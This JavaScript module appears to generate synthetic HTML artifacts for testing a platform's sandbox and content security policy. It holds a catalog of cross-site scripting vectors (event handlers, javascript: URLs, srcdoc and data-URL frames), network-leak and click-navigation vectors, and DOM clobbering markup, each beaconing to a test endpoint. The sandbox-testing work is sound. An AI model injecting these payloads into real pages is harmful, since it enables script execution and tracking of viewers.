// Synthetic artifacts for the spike. Nothing here comes from a client: the landing is invented.

const attr = (s) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;')

/** A self-contained snippet that reports «this ran» by every channel it can reach. */
export function mark(name, ext, t) {
  const hit = `${ext}/hit?t=${t}&v=`
  return (
    `(function(v){` +
    `try{top.postMessage('ran:'+v,'*')}catch(e){}` +
    `try{parent.__ran.push(v)}catch(e){}` +
    `try{top.__ran.push(v)}catch(e){}` +
    `try{document.documentElement.setAttribute('data-ran-'+v,'1')}catch(e){}` +
    `try{fetch('${hit}'+v,{mode:'no-cors'})}catch(e){}` +
    `try{(new Image()).src='${hit}'+v}catch(e){}` +
    `try{navigator.sendBeacon('${hit}'+v)}catch(e){}` +
    `})('${name}')`
  )
}

/** The script vectors that need no click. Each tries to set its own marker. */
export function autoVectors(ext, t) {
  const m = (n) => mark(n, ext, t)
  const res = (v, extra = '') => `${ext}/res?t=${t}&v=${v}${extra}`
  return [
    ['inline-script', `<script>${m('inline-script')}</script>`],
    ['script-module', `<script type="module">${m('script-module')}</script>`],
    ['script-src-ext', `<script src="${ext}/js?t=${t}&v=script-src-ext"></script>`],
    ['script-src-same', `<script src="/js?t=${t}&v=script-src-same"></script>`],
    ['script-src-data', `<script src="data:text/javascript,${encodeURIComponent(m('script-src-data'))}"></script>`],
    ['body-onload', null], // put on <body> itself
    ['img-onerror', `<img alt="" src="data:image/png;base64,AAAA" onerror="${attr(m('img-onerror'))}">`],
    ['img-onload', `<img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="${attr(m('img-onload'))}">`],
    ['svg-onload', `<svg width="1" height="1" onload="${attr(m('svg-onload'))}"></svg>`],
    ['svg-script', `<svg width="1" height="1"><script>${m('svg-script')}</script></svg>`],
    ['svg-animate-onbegin', `<svg width="1" height="1"><rect width="1" height="1"><animate attributeName="x" from="0" to="1" dur="1s" onbegin="${attr(m('svg-animate-onbegin'))}"/></rect></svg>`],
    ['style-onload', `<style onload="${attr(m('style-onload'))}">.never{}</style>`],
    ['link-css-onload', `<link rel="stylesheet" href="data:text/css,.never%7B%7D" onload="${attr(m('link-css-onload'))}">`],
    ['details-ontoggle', `<details open ontoggle="${attr(m('details-ontoggle'))}"><summary>Подробнее</summary>текст</details>`],
    ['input-autofocus-onfocus', `<input autofocus onfocus="${attr(m('input-autofocus-onfocus'))}">`],
    ['video-source-onerror', `<video><source src="data:," onerror="${attr(m('video-source-onerror'))}"></video>`],
    ['marquee-onstart', `<marquee onstart="${attr(m('marquee-onstart'))}">бегущая</marquee>`],
    ['iframe-srcdoc-script', `<iframe width="20" height="20" srcdoc="${attr(`<script>${m('iframe-srcdoc-script')}</script>`)}"></iframe>`],
    ['iframe-src-ext', `<iframe width="20" height="20" src="${ext}/page?t=${t}&v=iframe-src-ext"></iframe>`],
    ['iframe-javascript-src', `<iframe width="20" height="20" src="javascript:${attr(m('iframe-javascript-src'))}"></iframe>`],
    ['iframe-onload', `<iframe width="20" height="20" srcdoc="x" onload="${attr(m('iframe-onload'))}"></iframe>`],
    ['object-html', `<object width="20" height="20" type="text/html" data="${ext}/page?t=${t}&v=object-html"></object>`],
    ['embed-html', `<embed width="20" height="20" type="text/html" src="${ext}/page?t=${t}&v=embed-html">`],
    ['object-data-url', `<object width="20" height="20" type="text/html" data="data:text/html,${encodeURIComponent(`<script>${m('object-data-url')}</script>`)}"></object>`],
    ['noscript-img', `<noscript><img alt="" src="${res('noscript-img')}"></noscript>`],
  ]
}

/** Loads that run no script but leak the viewer's address if the policy lets them out. */
export function networkVectors(ext, t) {
  const res = (v, extra = '') => `${ext}/res?t=${t}&v=${v}${extra}`
  const same = (v) => `/api/probe?t=${t}&v=${v}`
  return [
    ['css-background', `<div style="width:10px;height:10px;background-image:url('${res('css-background')}')"></div>`],
    ['css-import', `<style>@import url('${res('css-import', '&type=css')}');</style>`],
    ['css-font-face', `<style>@font-face{font-family:Spy;src:url('${res('css-font-face')}') format('woff2')}.spy{font-family:Spy}</style><span class="spy">шрифт</span>`],
    ['css-list-image', `<ul style="list-style-image:url('${res('css-list-image')}')"><li>пункт</li></ul>`],
    ['css-image-set', `<div style="width:10px;height:10px;background-image:image-set('${res('css-image-set')}' 1x)"></div>`],
    ['link-stylesheet', `<link rel="stylesheet" href="${res('link-stylesheet', '&type=css')}">`],
    ['link-prefetch', `<link rel="prefetch" href="${res('link-prefetch')}">`],
    ['link-preload', `<link rel="preload" as="image" href="${res('link-preload')}">`],
    ['img-ext', `<img alt="" src="${res('img-ext')}">`],
    ['img-srcset', `<img alt="" srcset="${res('img-srcset')} 1x">`],
    ['picture-source', `<picture><source srcset="${res('picture-source')}"><img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></picture>`],
    ['video-poster', `<video width="10" height="10" poster="${res('video-poster')}"></video>`],
    ['audio-src', `<audio preload="auto" src="${res('audio-src', '&type=audio')}"></audio>`],
    ['input-image', `<input type="image" alt="" src="${res('input-image')}">`],
    ['svg-image', `<svg width="10" height="10"><image href="${res('svg-image')}" width="10" height="10"/></svg>`],
    ['svg-use', `<svg width="10" height="10"><use href="${res('svg-use')}#a"/></svg>`],
    ['object-image', `<object width="10" height="10" type="image/png" data="${res('object-image')}"></object>`],
    ['embed-image', `<embed width="10" height="10" type="image/png" src="${res('embed-image')}">`],
    ['table-background', `<table background="${res('table-background')}"><tr><td>я</td></tr></table>`],
    ['same-origin-img', `<img alt="" src="${same('same-origin-img')}">`],
    ['same-origin-css', `<link rel="stylesheet" href="${same('same-origin-css')}">`],
    ['noscript-same-origin-img', `<noscript><img alt="" src="${same('noscript-same-origin-img')}"></noscript>`],
  ]
}

/** Vectors that need a click of the user. Each gets a fresh frame. */
export function clickVectors(ext, t) {
  const hit = (v) => `${ext}/hit?t=${t}&v=${v}`
  const m = (n) => mark(n, ext, t)
  return [
    ['javascript-link', `<a id="c" href="javascript:${attr(m('javascript-link'))}">ссылка</a>`],
    ['onclick-button', `<button id="c" onclick="${attr(m('onclick-button'))}">кнопка</button>`],
    ['onclick-link', `<a id="c" href="#x" onclick="${attr(m('onclick-link'))}">ссылка</a>`],
    ['form-submit', `<form action="${hit('form-submit')}" method="get"><input name="q" value="1"><button id="c">Отправить</button></form>`],
    ['form-javascript-action', `<form action="javascript:${attr(m('form-javascript-action'))}"><button id="c">Отправить</button></form>`],
    ['link-self', `<a id="c" href="${hit('link-self')}">ссылка</a>`],
    ['link-same-origin', `<a id="c" href="/api/probe?t=${t}&v=link-same-origin">ссылка</a>`],
    ['link-blank', `<a id="c" href="${hit('link-blank')}" target="_blank">ссылка</a>`],
    ['link-blank-opener', `<a id="c" href="${hit('link-blank-opener')}" target="_blank" rel="opener">ссылка</a>`],
    ['link-top', `<a id="c" href="${hit('link-top')}" target="_top">ссылка</a>`],
    ['link-parent', `<a id="c" href="${hit('link-parent')}" target="_parent">ссылка</a>`],
    ['link-ping', `<a id="c" href="${hit('link-ping-nav')}" ping="${hit('link-ping')}">ссылка</a>`],
    ['link-download', `<a id="c" href="${hit('link-download')}" download="x.txt">скачать</a>`],
    ['base-target-top', `<base target="_top"><a id="c" href="${hit('base-target-top')}">ссылка</a>`],
    ['area-link', `<img id="cimg" alt="" usemap="#m" width="60" height="30" style="background:#c33" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><map name="m"><area id="c" shape="rect" coords="0,0,60,30" href="${hit('area-link')}" alt="зона"></map>`],
  ]
}

/** Documents that navigate by themselves; each gets a fresh frame. */
export function navVectors(ext, t) {
  const m = (n) => mark(n, ext, t)
  return [
    ['meta-refresh', `<meta http-equiv="refresh" content="0;url=${ext}/hit?t=${t}&v=meta-refresh">`],
    ['meta-refresh-javascript', `<meta http-equiv="refresh" content="0;url=javascript:${attr(m('meta-refresh-javascript'))}">`],
  ]
}

const META_CSP =
  "default-src 'none'; script-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data:; " +
  "connect-src 'none'; form-action 'none'; frame-src 'none'; child-src 'none'; object-src 'none'; worker-src 'none'; manifest-src 'none'; base-uri 'none'"

export const metaCsp = () => `<meta http-equiv="Content-Security-Policy" content="${META_CSP}">`

/** A whole document around body markup; `meta` — the platform's policy first in head. */
export function wrap(body, { meta = false, bodyAttrs = '', title = 'Артефакт', head = '' } = {}) {
  return (
    `<!doctype html><html lang="ru" data-artifact="1"><head>${meta ? metaCsp() : ''}<meta charset="utf-8">` +
    `<title>${title}</title>${head}</head><body${bodyAttrs}>${body}</body></html>`
  )
}

/** <base> changes every relative address of a document, so it gets a document of its own. */
export function baseDoc(ext, t, { meta = false } = {}) {
  return wrap(`<base href="${ext}/b/${t}/"><img alt="" src="base-href.gif"><p>База</p>`, { meta })
}

export function vectorsDoc(ext, t, { meta = false } = {}) {
  // SPIKE_VECTORS — a comma-separated subset (to find what makes an engine spin).
  const only = process.env.SPIKE_VECTORS ? new Set(process.env.SPIKE_VECTORS.split(',')) : null
  const vs = [...autoVectors(ext, t), ...networkVectors(ext, t)].filter(([n, h]) => h && (!only || only.has(n)))
  const body = vs.map(([n, h]) => `<div class="v" data-v="${n}">${h}</div>`).join('\n')
  return wrap(body, { meta, bodyAttrs: ` onload="${attr(mark('body-onload', ext, t))}"` })
}

/** The synthetic landing «Кофейня «Колос»» the editing checks run on. */
export function landingBody(ext, t) {
  const tall = Array.from({ length: 6 }, (_, i) => `<section class="tall" id="s${i}"><h2>Раздел ${i + 1}</h2><p>Текст раздела номер ${i + 1}: свежая выпечка, кофе и чай.</p></section>`).join('\n')
  return `
<header class="top">
  <nav><a id="nav-menu" href="#menu">Меню</a> <a id="nav-out" href="${ext}/hit?t=${t}&v=nav-out">Доставка</a> <a id="nav-top" href="${ext}/hit?t=${t}&v=nav-top" target="_top">Отзывы</a></nav>
</header>
<main>
  <h1 id="hero">Кофейня «Колос» — свежий хлеб каждый день</h1>
  <p id="lead">Печём с&nbsp;шести утра, варим кофе на&nbsp;зерне из&nbsp;Эфиопии.</p>
  <p id="mixed">Звоните: <a id="phone" href="tel:+70000000000">+7&nbsp;000 000-00-00</a> ежедневно<!-- c --> с 7 до 22.</p>
  <button id="order" class="cta">Заказать торт</button>
  <p id="empty"></p>
  <ul id="prices"><li>Капучино — 250&nbsp;₽</li><li>Круассан — 180&nbsp;₽</li><li>Багет — 120&nbsp;₽</li></ul>
  <div id="swatch" class="swatch">Образец цвета</div>
  <div id="scroller" class="scroller"><p id="inner1">Внутренняя прокрутка, строка 1</p><p>строка 2</p><p>строка 3</p><p>строка 4</p><p id="inner5">строка 5</p></div>
  <table id="tbl"><tr><td id="cell">Ячейка</td></tr>фостер</table>
  <b id="misnest">жирный<p id="misnest-p">абзац</b>хвост</p>
  <noscript><p id="ns">Без скриптов</p></noscript>
  ${tall}
</main>`
}

export const LANDING_STYLE = `<style>
body{margin:0;font:16px/1.4 system-ui,sans-serif;color:#222;background:#fff}
.top{padding:8px 16px;background:#f4efe6}
main{padding:16px}
h1{font-size:32px;margin:12px 0;background:#ffe08a}
#lead{background:#d8f0ff}
.cta{font-size:18px;padding:8px 16px;background:#2e7d32;color:#fff;border:0}
.swatch{width:300px;height:60px;background:rgb(0,170,255);color:#fff}
.scroller{height:60px;overflow:auto;border:1px solid #999;width:300px}
.tall{min-height:400px;border-top:1px solid #eee}
@media (max-width:600px){h1{font-size:22px;background:#ffb3b3}.swatch{width:200px}}
</style>`

export function landingDoc(ext, t, { meta = false } = {}) {
  return wrap(landingBody(ext, t), { meta, head: LANDING_STYLE, title: 'Кофейня «Колос»' })
}

/** DOM clobbering: names of the frame document a parent script might call. */
export function clobberDoc({ meta = false } = {}) {
  const body = `<h1 id="t">Заголовок</h1>
<img name="addEventListener" alt="" src="data:,">
<img name="querySelector" alt="" src="data:,">
<form name="getSelection"></form>
<form name="createElement"></form>
<img name="body" alt="" src="data:,">
<form name="defaultView"></form>
<img name="execCommand" alt="" src="data:,">
<form name="documentElement"></form>
<img name="activeElement" alt="" src="data:,">`
  return wrap(body, { meta })
}
